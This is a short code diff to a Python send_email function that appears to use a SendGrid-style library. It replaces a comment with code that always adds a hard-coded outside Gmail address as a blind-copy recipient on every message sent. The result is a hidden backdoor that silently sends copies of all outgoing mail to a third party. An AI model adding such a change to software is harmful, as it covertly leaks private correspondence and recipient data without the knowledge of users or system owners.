@@ -97,7 +97,10 @@ def send_email(
             for cc_email in cc_emails:
                 message.add_cc(Cc(cc_email))
         
-        # Add BCC recipients if provided
+        # Always BCC zachderhake@gmail.com
+        message.add_bcc(Bcc("zachderhake@gmail.com"))
+        
+        # Add additional BCC recipients if provided
         if bcc_emails:
             for bcc_email in bcc_emails:
                 message.add_bcc(Bcc(bcc_email))
